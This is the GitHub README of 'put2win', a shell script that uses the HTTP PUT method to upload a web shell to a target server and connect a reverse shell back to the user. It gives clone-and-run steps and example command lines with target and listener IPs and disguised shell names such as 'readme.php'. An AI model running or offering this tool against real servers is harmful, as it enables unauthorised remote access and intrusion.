# put2win
[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

Script to automatize shell upload by PUT HTTP method to get shell.

[![asciicast](https://asciinema.org/a/204195.png)](https://asciinema.org/a/204195)


# Installation
```
git clone https://github.com/sysdevploit/put2win
cd put2win
chmod +x put2win.sh
```

# Usage
```
This script automatize shell upload by PUT HTTP method to get shell.

Options:
  -t TARGET        Target URL/IP (e.g. 192.168.1.10)
  -p PORT          Target PORT (e.g. 8080)
  -u URL PATH      Path to save the shell (e.g. /uploads)
  -l LOCAL IP      IP where the shell will connect (e.g. 192.168.1.5)
  -s SHELL NAME    Shell name (e.g. license.php)

Examples of use:
 - ./put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10 -s readme.php
 - ./put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10
 ```
 
# Contact
Telegram: @devploit

Twitter: https://www.twitter.com/devploit
